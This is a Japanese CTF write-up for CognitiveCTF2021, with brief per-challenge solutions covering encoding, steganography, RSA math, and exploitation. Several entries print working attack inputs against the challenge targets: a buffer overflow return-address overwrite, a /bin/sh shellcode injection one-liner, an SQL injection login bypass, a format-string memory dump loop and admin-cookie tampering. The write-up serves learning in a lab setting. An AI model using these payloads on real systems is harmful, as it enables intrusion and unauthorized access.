# CognitiveCTF2021 writeup

# 使用したTool
- jpegAnalyzer  
- wire shark  
- 青い空を見上げればいつもそこに白い猫 for うさみみハリケーン
- EditThisCookie (chromeの拡張機能)
- CyberChef (encode/decodeのwebサイト)

# 50 points
## 2Warm
- 2進数に変換する
## Glory of the Garden
- 画像をcatで見て、grepかfindstrで検索
```
cat ./garden.jpg | grep "CTF"
cat ./garden.jpg | findstr "CTF"
```
## Insp3ct0r
- chromeなら「検証」でHTMLとCSSとJavaScriptを確認できる
## The Numbers
- アルファベットのインデックスに対応  
- 「num_to_alph.py」で解いた
## practice-run-1
- cat&grepで検索してもいける  
- おそらくほかの方法もある
## handy-shellcode (pt.50)
- linux 32bit用のshell codeをググってコピペした。  
- なんとなく、このプログラムでshellを呼び出すコードを書くらしい  
- shell codeはよくわからない  
- shell codeの作り方?は、アセンブリ言語を機械語に翻訳する過程を踏むらしい  

# 100 points
## 13 (pt.100)
- 「rot13」でググるとrot13.comがでてくるので、コピペするだけ
## Bases (pt.100)
- base64でデコードする  
- 「google エンコード」とかでググるといい感じのencode/decodeサイトがでてくる
## Easy1
- ワンタイムパッドをググって、仕組みを理解  
- table.txtがあるので、暗号鍵をもとに行(又は列)を参照し、その行で対応する暗号フラグの列(又は行)を参照していく。  
- 地道な作業  
## First Grep
- たしか、catしてgrep
```
cat file_name | grep CTF
```
## OverFlow 1
- バッファオーバーフローを考える  　
- vuln()内で参照するリターンアドレスが表示されるプログラムである  
- flag()のアドレスをgdbなどで調べる  
- オーバフローしてアドレスが変更される境界線(文字列の長さ)を模索し、境界線以降にflag()のアドレスを入れる  
- アドレス入力の際に、リトルエンディアンに気を付ける  
- 入力例は以下  
```
echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xe6\x85\x04\x08" | ./vuln
```
- CognitiveCTF{n0w_w3r3_ChaNg1ng_r3tURn5_f4c9f24e}
## dont-use-client-side
- ソースを見ると、HTMLにJavascriptが埋め込まれてる  
- どうやら、JSでパスワードチェックしている  
- JSで比較している文字列を並び変えるだけ  

## logon
- cookieのadminをTrueにする  
- chromeだと、「EditThisCookie」という拡張機能が便利

## strings it
- バイナリファイルなので、stringsコマンド使う(windowsはわからない)
```
strings file_name | grep CTF
```

## vault-door-1
- Javaコードの中にパスワードを比較している部分がある  
- 32文字  
- 単純に並び変える？  

## what's a net cat?
- netcat使うだけ　　
```
nc address ip
```

## where are the robots
- robots.txtにアクセスして、そこの指示に従うだけ　　


# 150 points
## So Meta
- たしか、catしてgrepするだけ
```
cat file_name | grep CTF
```

## What Lies Within
- 「青い空を～」のステガノグラフィー解析を使った  
- 各色の最下位委ビットを選択して抽出する

## shark on wire 1
- ワイヤーシャークなどのパケット解析ツールを使用した  
- UDPストリームを愚直に調べる  


# 200 points
## Based
- 「CyberChef」で数字入れてautobakeすると、いい感じにでコードしてくれる  
- 2, 8, 10, 16進数を文字に変換するタスク  
- utf-8？shift-jis？  

## Tapping
- ncでアクセスすると、モールス信号が表示される
- モールス信号の返還サイトで変換

## asm1
- アセンブリ言語を頑張って読む  
- 答えの形式は、"CognitiveCTF{0xaaa}"のような感じ  

## plumbing
- ncしたのをパイプしてgrep
```
nc host_name port | grep CTF
```

## rsa_pop_quiz
- 結構時間かかった。RSAの仕組みと計算方法を理解しておくと速く解けそう  
- 問題文に表示されているnetcatを実行し、問題に答える  
- 全部で８問くらいあり、各問いの最初はこの問題が解けるかどうかをy/nでこたえる  
- 最後の問いで暗号文を平文に戻すが、以下のコードを使用した  
```
# p, n, e, c(暗号文)は事前に定義する必要あり
q = n // p
# pip install pycryptodome
from Crypto.Util.number import inverse
phai = (p - 1) * (q - 1)
d = inverse(e, phai)
pt = pow(c, d, n)
print(pt)s
```
- 表示された平文をHEXに変換し、asciiに変換する作業は、「CyberChef」がおすすめ  

## slippery_shellcode
- 「handy-shellcode」とほぼ同じコードだが、rand()を使っている
- rand()はseed値が固定という脆弱性があるそうなので、変数offsetのとる値をLinux環境で調べる(windowsではgid_tでerror)
- offsetは常に104とわかるので、shellcodeの前に適当な104文字をくっつけて入力するだけ
```
(python -c "print 'a'*104 + '\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1'";cat) | ./vuln
```
- shellが起動するので、flag.txtをcatする

## whats-the-difference
- 結構悩んだ  
- cmpコマンドとgawkで差分のバイトをASCII変換  
```
cmp -l cattos.jpg kitters.jpg | gawk '{printf "%c", strtonum(0$2)}' && echo
```
- 上記の出力を回答しても、正解にならない。。。  
- cat_kit.pyを作成し、バイナリでjpgファイルを読み込んで、差分をASCIIに変換する  
```
python cat_kit.py
```
- 結果は同じになった  
- flagをよく見ると、ある程度単語があって、たまに数字になってる  
- "_bu77r_"をbufferと解釈し、"_bu773r_"とすると通った  
- 原因は不明...  

## where-is-the-file
```
ls -a
cat secret_file
```


# 250 points
## asm2
- 引数が2つの時のアセンブリ言語の挙動を追っていく
- どうやら以下のプログラムに変換できそうなので、やってみる
```
a1 = 0xf
a2 = 0x21
while a1 < 0xcdf1:
    a2 += 0x1
    a1 += 0xe3
print(hex(a2))
```

## c0rrupt
- fileを渡されるが、「青空白猫」のバイナリエディタで解析してみるとpngファイルっぽい
- ヒントにheaderを直す旨が書かれていたので、pngのフォーマットを調べて修正をかける
- linuxでは、「pngcheck」というtoolがあるため、使うとCRCの部分を計算して提案してくれたりする
- やったこととしては、PNG、IHDR、IDATのシグネチャとIDATのlengthを修正
- IDATのlength(サイズは4byte)は、先頭2byteを0にするだけだった

## like1000
- .tarファイルを解凍するshellスクリプトを書く  
- 例えば以下のコードを'hoge.sh'として保存し、実行する  
```
#! /bin/bash
i=100
tmp=''
hoge='.tar'
for ((i=1000;i>=1;i-->))
do
tmp=$i$hoge
tar -xvf $tmp
rm $tmp
done
```
```
bash hoge.sh
```


# 300 points
## Irish-Name-Repo 1
- SQLインジェクションの代表的な奴をうちこむ
- ユーザ名の入力フォームに以下を打つ
```
' or 1 = 1 --
```

## flag_shop
- プログラムを見ると、フラグを購入する数が代入される変数はintで定義されている
- intはだいたい4byteで、取りうる値の範囲がわかるので負の値になるように入力する
- 自分の所持金が増えるはずなので、1337flagを購入する

## miniRSA
- eが小さいときには、dを算出することなしに、暗号文を復号できる
- 手法はcのe乗根をとるだけ
```
n = 29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673
e = 3
c = 632842384140587174830925541187412664996674169932996191508185732662783016874159287466298559845859187680481790912872257884508491688706582583466621670584934824968165027905248218081988895883829955005590459045563487575434041612025991120362101218958824365113954333662349365055333 
from Crypto.Util.number import *
import gmpy
m = int(gmpy.root(c, e)[0])
print(long_to_bytes(m))
```

## mus1c
- rockstarと呼ばれる歌詞みたいなプログラミング言語らしい。以下のサイトで翻訳できる。
- https://codewithrockstar.com/online
- ASCIIコードが出力されるので、文字列に変換するだけ

## stringzz
- format string攻撃
- どうやら、標準入力の変数をprintf()やputs()などの関数の引数に渡すとよくないらしい
- メモリの中身を見れるらしいので、以下のshell codeを書いて、flagを探す
```
#! /bin/bash

for ((i=0;i<100;i++))
do
echo -e "%$i\$s" | ./vuln | grep CTF
done
```

## waves over lambda
- アクセスすると、暗号文が表示される
- (https://quipqiup.com/)にアクセスして、アルファベットの対応関係を探る
- 最初の文は、「congrats here is your flag」に対応すると他サイトを見て知った
- ほかの対応関係は、長文をもとに探る


# 350 points
## 1_wanna_b3_a_r0ck5tar
- rockstarというプログラミング言語
- Listenやifなどの入力待ちや条件分岐があるので、削除するだけ

## pastaAAA
- png画像が渡されるので、青空白猫でステガノグラフィー解析する
- 各色の0bit目を抽出するとflag画像がでてくる

